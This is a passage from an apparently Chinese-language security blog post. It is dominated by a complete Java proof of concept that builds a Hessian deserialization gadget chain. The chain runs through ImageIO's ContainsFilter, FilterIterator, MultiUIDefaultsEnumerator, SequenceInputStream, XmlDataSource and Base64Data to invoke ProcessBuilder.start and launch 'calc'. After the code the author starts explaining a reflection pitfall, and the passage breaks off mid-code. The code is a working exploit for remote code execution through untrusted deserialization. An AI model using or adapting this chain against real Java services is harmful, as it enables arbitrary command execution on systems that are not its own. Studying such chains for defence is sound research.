+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//import static javax.swing.MultiUIDefaults.MultiUIDefaultsEnumerator.Type;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//import static javax.swing.MultiUIDefaults.MultiUIDefaultsEnumerator.Type.KEYS;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Main</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        ProcessBuilder processBuilder<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> ProcessBuilder<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;calc&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object filter<span style="color:#ff79c6">=</span>obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.imageio.ImageIO$ContainsFilter&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>filter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;method&#34;</span><span style="color:#ff79c6">,</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;start&#34;</span><span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>filter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;name&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;start&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Iterator iter<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Iterator<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.util.ArrayList$Itr&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        setValue(iter,&#34;this$0&#34;,processBuilder);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;cursor&#34;</span><span style="color:#ff79c6">,</span>0<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        setValue(iter,&#34;size&#34;,1,);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;lastRet&#34;</span><span style="color:#ff79c6">,-</span>1<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;expectedModCount&#34;</span><span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;lastRet&#34;</span><span style="color:#ff79c6">,-</span>1<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Iterator iterator<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Iterator<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.imageio.spi.FilterIterator&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Field out<span style="color:#ff79c6">=</span>iter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;this$0&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        ArrayList a<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> ArrayList<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        a<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>processBuilder<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        a.add(new ProcessBuilder(&#34;calc&#34;));
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;this$0&#34;</span><span style="color:#ff79c6">,</span>a<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iterator<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;iter&#34;</span><span style="color:#ff79c6">,</span>iter<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iterator<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;filter&#34;</span><span style="color:#ff79c6">,</span>filter<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        AbstractMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">SimpleEntry</span> entry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> AbstractMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">SimpleEntry</span><span style="color:#ff79c6">&lt;&gt;(</span>obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.io.ByteArrayInputStream&#34;</span><span style="color:#ff79c6">),</span> <span style="color:#f1fa8c">&#34;one&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>iterator<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;next&#34;</span><span style="color:#ff79c6">,</span>entry<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        setValue(iterator,&#34;next&#34;,1);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Enumeration e<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Enumeration<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Class eClass<span style="color:#ff79c6">=</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Field typeField<span style="color:#ff79c6">=</span>eClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredFields</span><span style="color:#ff79c6">()[</span>1<span style="color:#ff79c6">];</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">,</span> typeField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getType</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getEnumConstants</span><span style="color:#ff79c6">()[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;iterator&#34;</span><span style="color:#ff79c6">,</span>iterator<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream ips<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>ByteArrayInputStream<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.io.ByteArrayInputStream&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>ips<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;buf&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>ips<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;pos&#34;</span><span style="color:#ff79c6">,</span>0<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>ips<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;mark&#34;</span><span style="color:#ff79c6">,</span>0<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>ips<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;count&#34;</span><span style="color:#ff79c6">,</span>0<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        SequenceInputStream is<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>SequenceInputStream<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.io.SequenceInputStream&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>is<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;e&#34;</span><span style="color:#ff79c6">,</span>e<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>is<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;in&#34;</span><span style="color:#ff79c6">,</span>ips<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        DataSource dataSource<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>DataSource<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>dataSource<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;contentType&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;text/plain&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>dataSource<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;is&#34;</span><span style="color:#ff79c6">,</span>is<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>dataSource<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;consumed&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">false</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        DataHandler dataHandler<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> DataHandler<span style="color:#ff79c6">(</span>dataSource<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Base64Data data<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Base64Data<span style="color:#ff79c6">)</span> obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>data<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;dataHandler&#34;</span><span style="color:#ff79c6">,</span>dataHandler<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>data<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;data&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        data.toString();
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//        Base64Data data=getBase64Data();
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        ByteArrayOutputStream byteArrayOutputStream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Hessian2Output hessianOutput1<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> Hessian2Output<span style="color:#ff79c6">(</span>byteArrayOutputStream<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getSerializerFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">setAllowNonSerializable</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeString</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;aaa&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>data<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flushBuffer</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>byteArrayOutputStream<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        System.out.println(Base64.getEncoder().encodeToString(b));
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        deserialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">obj</span><span style="color:#ff79c6">(</span>String s<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> ClassNotFoundException<span style="color:#ff79c6">,</span> InvocationTargetException<span style="color:#ff79c6">,</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> createWithoutConstructor<span style="color:#ff79c6">(</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>T o<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bao <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Hessian2Output output <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Hessian2Output<span style="color:#ff79c6">(</span>bao<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        output<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getSerializerFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">setAllowNonSerializable</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        output<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>bao<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> bao<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bai <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Hessian2Input input <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Hessian2Input<span style="color:#ff79c6">(</span>bai<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#ff79c6">=</span> input<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">(</span>T<span style="color:#ff79c6">)</span> o<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setValueByClassName</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">,</span>String className<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span>className<span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithoutConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> createWithConstructor<span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">],</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> constructorClass<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?&gt;[]</span> consArgTypes<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">[]</span> consArgs <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> objCons <span style="color:#ff79c6">=</span> constructorClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>consArgTypes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?&gt;</span> sc <span style="color:#ff79c6">=</span> ReflectionFactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getReflectionFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">newConstructorForSerialization</span><span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>sc<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">(</span>T<span style="color:#ff79c6">)</span>sc<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>consArgs<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span>AccessibleObject member<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String versionStr <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.version&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> javaVersion <span style="color:#ff79c6">=</span> Integer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">parseInt</span><span style="color:#ff79c6">(</span>versionStr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">split</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;\\.&#34;</span><span style="color:#ff79c6">)[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>javaVersion <span style="color:#ff79c6">&lt;</span> 12<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// quiet runtime warnings from JDK9+
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//            Permit.setAccessible(member);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// not possible to quiet runtime warnings anymore...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// see https://bugs.openjdk.java.net/browse/JDK-8210522
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// to understand impact on Permit (i.e. it does not work
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// anymore with Java &gt;= 12)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            member<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>由于我太菜了，写出这个感觉也够呛的，讲一两个遇到的坑点</p>
+<h3 id="反射修改外部类属性">反射修改外部类属性</h3>
+<p>触发链中会调用一个内部私有类的方法<code>java.util.ArrayList$Itr#hasNext</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Itr</span> <span style="color:#8be9fd;font-style:italic">implements</span> Iterator<span style="color:#ff79c6">&lt;</span>E<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> cursor<span style="color:#ff79c6">;</span>       <span style="color:#6272a4">// index of next element to return
